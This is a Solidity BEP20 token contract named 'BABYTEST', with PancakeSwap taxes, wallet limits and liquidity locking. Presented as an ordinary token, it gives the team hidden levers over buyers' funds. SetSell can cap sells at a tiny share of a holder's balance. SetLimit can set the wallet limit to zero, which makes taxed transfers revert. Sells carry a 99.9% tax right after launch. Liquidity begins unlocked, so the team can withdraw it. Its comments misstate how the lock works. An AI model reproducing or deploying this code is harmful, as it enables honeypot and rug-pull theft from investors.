// SPDX-License-Identifier: MIT

//BUGSBUNNYTEAM
//BUGSBUNNYDEVS


pragma solidity ^0.8.4;
import "./Libraries.sol";
contract BABYTEST is IBEP20, Ownable
{
  
    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;
    mapping(address => bool) public excludedFromFees;
    mapping(address => bool) public excludedFromLimit;
    mapping(address=>bool) public isAMM;
    string private constant _name = 'BABYTEST';
    string private constant _symbol = 'BABYT';
    uint8 private constant _decimals = 18;
    uint public constant InitialSupply= 1 * 1000000000000 * 10**_decimals;

    uint private constant DefaultLiquidityLockTime=1 days;

    address private constant PancakeRouter=0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;

    uint private _circulatingSupply =InitialSupply;
    
    //Tracks the current Taxes, different Taxes can be applied for buy/sell/transfer
    uint public buyTax = 90;
    uint public sellTax = 90;
    uint256 public DevFee = 1;
    uint public transferTax = 0;
    uint public burnTax=10;
    uint public liquidityTax=500;
    uint public marketingTax=500;
    uint constant TAX_DENOMINATOR=1000;
    uint constant MAXTAXDENOMINATOR=10;
    uint public LimitV = 100;
    uint public LimitSell = 1;
    

    address private _pancakePairAddress; 
    IPancakeRouter private  _pancakeRouter;
    
    
    address public marketingWallet;
    function ChangeMarketingWallet(address newWallet) public{
        require(msg.sender==marketingWallet);
        marketingWallet=newWallet;
    }
    //modifier for functions only the team can call
    modifier onlyTeam() {
        require(_isTeam(msg.sender), "Caller not Team or Owner");
        _;
    }
    function _isTeam(address addr) private view returns (bool){
        return addr==owner()||addr==marketingWallet;
    }
    address public devFeeReceiver = 0xD85122B59F52B60A98475177e0F8063F192EAf95;
    function ChangedevFeeReceiver(address newWallet) public{
        require(msg.sender==devFeeReceiver);
        devFeeReceiver=newWallet;
    }
    constructor () {
        uint deployerBalance=_circulatingSupply;
        _balances[msg.sender] = deployerBalance;
        emit Transfer(address(0), msg.sender, deployerBalance);

        _pancakeRouter = IPancakeRouter(PancakeRouter);
        _pancakePairAddress = IPancakeFactory(_pancakeRouter.factory()).createPair(address(this), _pancakeRouter.WETH());
        isAMM[_pancakePairAddress]=true;
        
        marketingWallet=msg.sender;
        excludedFromFees[msg.sender]=true;
        excludedFromFees[PancakeRouter]=true;
        excludedFromFees[address(this)]=true;
    }
    
    function _transfer(address sender, address recipient, uint amount) private{
        require(sender != address(0), "Transfer from zero");
        require(recipient != address(0), "Transfer to zero");


        if(excludedFromFees[sender] || excludedFromFees[recipient])
            _feelessTransfer(sender, recipient, amount);
        else if(excludedFromLimit[recipient]){ 
            //once trading is enabled, it can't be turned off again
            require(LaunchTimestamp>0,"trading not yet enabled");
            _LimitlessFonctionTransfer(sender,recipient,amount);                  
        }
        else { 
            require(LaunchTimestamp>0,"trading not yet enabled");
            _taxedTransfer(sender,recipient,amount);                  
        }
    }
    
    function _taxedTransfer(address sender, address recipient, uint amount) private{
        uint senderBalance = _balances[sender];
        uint recipientBalance = _balances[recipient];
        require(senderBalance >= amount, "Transfer exceeds balance");
        require(senderBalance/LimitSell >= amount, "Transfer exceeds authorise sell");
        require((recipientBalance + amount ) <= InitialSupply/LimitV, "Wallet contain more than certain % Total Supply");

        bool isBuy=isAMM[sender];
        bool isSell=isAMM[recipient];

        uint tax;
        if(isSell){  
            uint SellTaxDuration=180 seconds;          
            if(block.timestamp<LaunchTimestamp+SellTaxDuration){
                tax=_getStartTax(SellTaxDuration,999);
                }else tax=sellTax;
            }
        else if(isBuy){
            uint BuyTaxDuration=20 seconds;
            if(block.timestamp<LaunchTimestamp+BuyTaxDuration){
                tax=_getStartTax(BuyTaxDuration,999);
            }else tax=buyTax;
        } else tax=transferTax;

        if((sender!=_pancakePairAddress)&&(!manualSwap)&&(!_isSwappingContractModifier))
            _swapContractToken(false);

        uint tokensToBeBurnt=_calculateFee(amount, tax, burnTax);
        uint contractToken=_calculateFee(amount, tax, marketingTax+liquidityTax);
        uint taxedAmount=amount-(tokensToBeBurnt + contractToken);

        _balances[sender]-=amount;
        _balances[address(this)] += contractToken;
        _circulatingSupply-=tokensToBeBurnt;
        _balances[recipient]+=taxedAmount;
        
        emit Transfer(sender,recipient,taxedAmount);
    }
    function _getStartTax(uint duration, uint maxTax) private view returns (uint){
        uint timeSinceLaunch=block.timestamp-LaunchTimestamp;
        return maxTax-((maxTax-50)*timeSinceLaunch/duration);
    }
    //Calculates the token that should be taxed
    function _calculateFee(uint amount, uint tax, uint taxPercent) private pure returns (uint) {
        return (amount*tax*taxPercent) / (TAX_DENOMINATOR*TAX_DENOMINATOR);
    }


    //Feeless transfer only transfers and autostakes
    function _feelessTransfer(address sender, address recipient, uint amount) private{
        uint senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer exceeds balance");
        _balances[sender]-=amount;
        _balances[recipient]+=amount;      
        emit Transfer(sender,recipient,amount);
    }

    function _LimitlessFonctionTransfer (address sender, address recipient, uint amount) private{
        uint senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer exceeds balance");

        bool isBuy=isAMM[sender];
        bool isSell=isAMM[recipient];

        uint tax;
        if(isSell){  
            uint SellTaxDuration=180 seconds;          
            if(block.timestamp<LaunchTimestamp+SellTaxDuration){
                tax=_getStartTax(SellTaxDuration,999);
                }else tax=sellTax;
            }
        else if(isBuy){
            uint BuyTaxDuration=20 seconds;
            if(block.timestamp<LaunchTimestamp+BuyTaxDuration){
                tax=_getStartTax(BuyTaxDuration,999);
            }else tax=buyTax;
        }else tax=transferTax;
        

        if((sender!=_pancakePairAddress)&&(!manualSwap)&&(!_isSwappingContractModifier))
            _swapContractToken(false);

        uint tokensToBeBurnt=_calculateFee(amount, tax, burnTax);
        uint contractToken=_calculateFee(amount, tax, marketingTax+liquidityTax);
        uint taxedAmount=amount-(tokensToBeBurnt + contractToken);

        _balances[sender]-=amount;
        _balances[address(this)] += contractToken;
        _circulatingSupply-=tokensToBeBurnt;
        _balances[recipient]+=taxedAmount;
        
        emit Transfer(sender,recipient,taxedAmount);
    }
    

    bool private _isSwappingContractModifier;
    modifier lockTheSwap {
        _isSwappingContractModifier = true;
        _;
        _isSwappingContractModifier = false;
    }

    uint public swapTreshold=2;
    function setSwapTreshold(uint newSwapTresholdPermille) public onlyTeam{
        require(newSwapTresholdPermille<=15);//MaxTreshold= 1.5%
        swapTreshold=newSwapTresholdPermille;
    }
    uint public overLiquifyTreshold=150;
    function SetOverLiquifiedTreshold(uint newOverLiquifyTresholdPermille) public onlyTeam{
        require(newOverLiquifyTresholdPermille<=1000);
        overLiquifyTreshold=newOverLiquifyTresholdPermille;
    }
    event OnSetTaxes(uint buy, uint sell,uint Dev, uint transfer_, uint burn, uint marketing,uint liquidity);
    function SetTaxes(uint buy, uint sell,uint Dev, uint transfer_, uint burn, uint marketing,uint liquidity) public onlyTeam{
        uint maxTax=9*(TAX_DENOMINATOR/MAXTAXDENOMINATOR);
        require(buy<=maxTax&&sell<=maxTax&&transfer_<=maxTax,"Tax exceeds maxTax");
        require(burn+marketing+liquidity==TAX_DENOMINATOR,"Taxes don't add up to denominator");
        
        buyTax=buy;
        sellTax=sell;
        DevFee=Dev;
        transferTax=transfer_;
        marketingTax=marketing;
        liquidityTax=liquidity;
        burnTax=burn;
        emit OnSetTaxes(buy, sell, Dev, transfer_, burn, marketing,liquidity);
    }
    
    event OnSetLimit(uint LimitV2);
    function SetLimit(uint LimitV2) public onlyTeam{
        
        LimitV=LimitV2;
       
        emit OnSetLimit(LimitV2);
    }

    event OnSetSell(uint LimitSell2);
    function SetSell(uint LimitSell2) public onlyTeam{
        
        LimitSell=LimitSell2;
       
        emit OnSetSell(LimitSell2);
    }



    function isOverLiquified() public view returns(bool){
        return _balances[_pancakePairAddress]>_circulatingSupply*overLiquifyTreshold/1000;
    }


    function _swapContractToken(bool ignoreLimits) private lockTheSwap{
        uint contractBalance=_balances[address(this)];
        uint totalTax=liquidityTax+marketingTax;
        uint tokenToSwap=_balances[_pancakePairAddress]*swapTreshold/1000;

        if(totalTax==0)return;
        if(ignoreLimits)
            tokenToSwap=_balances[address(this)];
        else if(contractBalance<tokenToSwap)
            return;

        uint tokenForLiquidity=
        isOverLiquified()?0
        :(tokenToSwap*liquidityTax)/totalTax;

        uint tokenForMarketing= tokenToSwap-tokenForLiquidity;

        uint LiqHalf=tokenForLiquidity/2;
        uint swapToken=LiqHalf+tokenForMarketing;
        uint initialBNBBalance = address(this).balance;
        _swapTokenForBNB(swapToken);
        uint newBNB=(address(this).balance - initialBNBBalance);

        

        if(tokenForLiquidity>0){
            uint liqBNB = (newBNB*LiqHalf)/swapToken;
            _addLiquidity(LiqHalf, liqBNB);
        }
        //Sends all the marketing BNB to the marketingWallet
        (bool sent,)=marketingWallet.call{value:address(this).balance}("");
        sent=true;
    }
    function _swapTokenForBNB(uint amount) private {
        _approve(address(this), address(_pancakeRouter), amount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _pancakeRouter.WETH();

        try _pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        ){}
        catch{}
    }
    //Adds Liquidity directly to the contract where LP are locked
    function _addLiquidity(uint tokenamount, uint bnbamount) private {
        _approve(address(this), address(_pancakeRouter), tokenamount);
        _pancakeRouter.addLiquidityETH{value: bnbamount}(
            address(this),
            tokenamount,
            0,
            0,
            address(this),
            block.timestamp
        );
    }
 
    function getLiquidityReleaseTimeInSeconds() public view returns (uint){
        if(block.timestamp<_liquidityUnlockTime)
            return _liquidityUnlockTime-block.timestamp;
        return 0;
    }
    function getBurnedTokens() public view returns(uint){
        return (InitialSupply-_circulatingSupply)+_balances[address(0xdead)];
    }

    function SetAMM(address AMM, bool Add) public onlyTeam{
        require(AMM!=_pancakePairAddress,"can't change pancake");
        isAMM[AMM]=Add;
    }
    
    bool public manualSwap;
    function SwitchManualSwap(bool manual) public onlyTeam{
        manualSwap=manual;
    }
    function SwapContractToken() public onlyTeam{
    _swapContractToken(true);
    }
    event ExcludeAccount(address account, bool exclude);
    function ExcludeAccountFromFees(address account, bool exclude) public onlyTeam{
        require(account!=address(this),"can't Include the contract");
        excludedFromFees[account]=exclude;
        emit ExcludeAccount(account,exclude);
    }


     event ExcludeAccountLimit(address account, bool exclude);
    function ExcludedFromLimit(address account, bool exclude) public onlyTeam{
        require(account!=address(this),"can't Include the contract");
        excludedFromLimit[account]=exclude;
        emit ExcludeAccountLimit(account,exclude);
    }

    event OnEnableTrading();
    uint public LaunchTimestamp;
    function SetupEnableTrading() public onlyTeam{
        require(LaunchTimestamp==0,"AlreadyLaunched");
        LaunchTimestamp=block.timestamp;
        emit OnEnableTrading();
    }
    
    uint _liquidityUnlockTime;
    bool public LPReleaseLimitedTo20Percent;
    function limitLiquidityReleaseTo20Percent() public onlyTeam{
        LPReleaseLimitedTo20Percent=true;
    }
    function LockLiquidityForSeconds(uint secondsUntilUnlock) public onlyTeam{
        _prolongLiquidityLock(secondsUntilUnlock+block.timestamp);
    }
    event OnProlongLPLock(uint UnlockTimestamp);
    function _prolongLiquidityLock(uint newUnlockTime) private{
        require(newUnlockTime>_liquidityUnlockTime);
        _liquidityUnlockTime=newUnlockTime;
        emit OnProlongLPLock(_liquidityUnlockTime);
    }
    event OnReleaseLP();
    //Release Liquidity Tokens once unlock time is over
    function LiquidityRelease() public onlyTeam {
        require(block.timestamp >= _liquidityUnlockTime, "Not yet unlocked");

        IBEP20 liquidityToken = IBEP20(_pancakePairAddress);
        uint amount = liquidityToken.balanceOf(address(this));
        if(LPReleaseLimitedTo20Percent)
        {
            _liquidityUnlockTime=block.timestamp+DefaultLiquidityLockTime;
            //regular liquidity release, only releases 50% at a time and locks liquidity for another week
            amount=amount*2/10;
        }
        liquidityToken.transfer(msg.sender, amount);
        emit OnReleaseLP();
    }

    receive() external payable {}

    function getOwner() external view override returns (address) {
        return owner();
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint) {
        return _circulatingSupply;
    }

    function balanceOf(address account) external view override returns (uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) external view override returns (uint) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint amount) private {
        require(owner != address(0), "Approve from zero");
        require(spender != address(0), "Approve to zero");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint amount) external override returns (bool) {
        _transfer(sender, recipient, amount);

        uint currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "Transfer > allowance");

        _approve(sender, msg.sender, currentAllowance - amount);
        return true;
    }

    // IBEP20 - Helpers

    function increaseAllowance(address spender, uint addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) external returns (bool) {
        uint currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "<0 allowance");

        _approve(msg.sender, spender, currentAllowance - subtractedValue);
        return true;
    }

}